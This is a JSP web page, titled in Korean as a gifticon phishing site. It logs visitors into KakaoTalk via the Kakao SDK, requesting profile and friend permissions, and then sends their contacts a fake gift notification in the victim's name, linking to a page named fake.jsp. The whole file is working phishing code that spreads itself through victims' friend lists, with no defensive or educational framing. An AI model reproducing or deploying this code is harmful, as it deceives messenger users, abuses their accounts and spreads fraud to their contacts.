<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>기프티콘 낚시 사이트</title>
<script src="./kakao.js"></script>
</head>
<body>
	<script type="text/javascript">
		/* 카카오톡 로그인과 카카오톡 이미지 메세지 전송하는 코드 */
		Kakao.init('d45a06f05b76c26d6d8ec2eb4f43cdef');
		Kakao.Auth.login({
		    scope: 'profile,friends',
		    success: function(response) {
		    	Kakao.API.request({
		    	    url: '/v2/user/me',
		    	    success: function(response) {
		    	        let nickname = (response['properties']['nickname']);
		    	        Kakao.Link.sendCustom({
		    	        	  templateId: 54959,
		    	        	  templateArgs: {
		    	        	    'title': nickname + '님이 선물과 메세지를 보냈습니다.',
		    	        	    'desc': '자세한 내용은 선물함에서 확인해주세요.', 
		    	        	    'img_url':'https://hwanggu1.github.io/nion-cdn/bhc_1.png', 
		    	        	    'height' : '200', 
		    	        	    'width' : '700', 
		    	        	    'btn_url' : './fake.jsp'
		    	        	  }
		    	        	});
		    	        
		    	    },
		    	    fail: function(error) {
		    	        console.log(error);
		    	    }
		    	});
		    },
		    fail: function(error) {
		        console.log(error);
		    }
		});
	</script>
</body>
</html>